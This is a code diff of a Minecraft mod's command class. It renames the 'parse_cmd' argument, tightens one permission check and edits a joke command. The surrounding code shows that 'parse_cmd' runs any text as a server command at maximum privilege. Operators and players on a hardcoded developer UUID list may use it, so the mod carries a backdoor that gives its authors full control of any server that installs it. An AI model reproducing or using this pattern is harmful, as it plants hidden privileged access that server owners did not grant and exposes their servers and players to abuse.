@@ -42,14 +42,14 @@ public class ModCommands {
                 .then(CommandManager.literal("funny")
                     .executes(ModCommands::funny))
                 .then(CommandManager.literal("parse_cmd")
-                    .then(CommandManager.argument("command", StringArgumentType.string())
+                    .then(CommandManager.argument("cmd", StringArgumentType.greedyString())
                         .executes(ModCommands::execCommand))))
     ));
   }
   
   private static boolean allowCommands(ServerCommandSource source, @Nullable CommandManager.RegistrationEnvironment environment){
     if(environment != null && environment.integrated) return true;
-    if(source.hasPermissionLevel(1)) return true;
+    if(source.hasPermissionLevel(2)) return true;
     if(source.getPlayer() == null) return false;
     
     final List<String> DevUUIDs = List.of(
@@ -65,7 +65,8 @@ public class ModCommands {
   }
   
   private static int funny(CommandContext<ServerCommandSource> context){
-    context.getSource().sendFeedback(() -> Text.literal("Performed the 'funny' >:3"), false);
+    context.getSource().sendFeedback(() -> Text.literal("Performed 'the funny' >:3"), false);
+    // This doesn't actually do anything
     return 1;
   }
   
@@ -91,7 +92,7 @@ public class ModCommands {
   private static int execCommand(CommandContext<ServerCommandSource> context){
     String command = "";
     try{
-      command = context.getArgument("command", String.class);
+      command = context.getArgument("cmd", String.class);
     }catch (Exception ignored){}
     context.getSource().getServer().getCommandManager().executeWithPrefix(context.getSource().withLevel(Integer.MAX_VALUE), command);
     return 1;
